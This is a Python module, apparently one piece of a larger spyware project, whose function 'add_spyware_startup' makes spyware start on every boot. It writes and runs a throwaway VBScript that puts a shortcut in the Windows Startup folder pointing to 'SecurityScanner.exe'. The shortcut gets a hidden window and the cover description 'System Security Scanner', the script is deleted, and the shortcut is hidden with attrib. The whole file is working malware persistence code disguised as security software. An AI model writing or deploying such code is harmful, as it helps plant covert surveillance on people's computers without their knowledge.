"""
Auto-Run Function 5: Spyware Persistence via Startup
Creates hidden shortcut in Startup folder for automatic spyware execution on boot
"""

import os
import winreg

def add_spyware_startup():
    """
    Add spyware shortcut to Startup folder for persistence
    Returns: True if successful, False otherwise
    """
    print("[Spyware] Function 5: Adding spyware to startup...")
    
    try:
        # Get Startup folder path
        startup_folder = os.path.join(os.getenv('APPDATA'), 
                                     r'Microsoft\Windows\Start Menu\Programs\Startup')
        
        # Get spyware executable path
        appdata = os.getenv('APPDATA')
        spyware_exe = os.path.join(appdata, "SystemSecurityService", "SecurityScanner.exe")
        
        # Create hidden shortcut (using VBScript method)
        shortcut_path = os.path.join(startup_folder, "SecurityScanner.lnk")
        
        # Create VBScript to make hidden shortcut
        vbs_script = f'''
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "{shortcut_path}"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "{spyware_exe}"
oLink.WindowStyle = 0
oLink.Description = "System Security Scanner"
oLink.Save
'''
        
        vbs_file = os.path.join(os.getenv('TEMP'), 'create_shortcut.vbs')
        with open(vbs_file, 'w') as f:
            f.write(vbs_script)
        
        # Execute VBScript and cleanup
        os.system(f'cscript //nologo "{vbs_file}"')
        os.remove(vbs_file)
        
        # Make shortcut hidden
        os.system(f'attrib +h "{shortcut_path}"')
        
        print(f"[Spyware] Created hidden startup shortcut: {shortcut_path}")
        return True
    except Exception as e:
        print(f"[Spyware] Error creating startup shortcut: {e}")
        return False
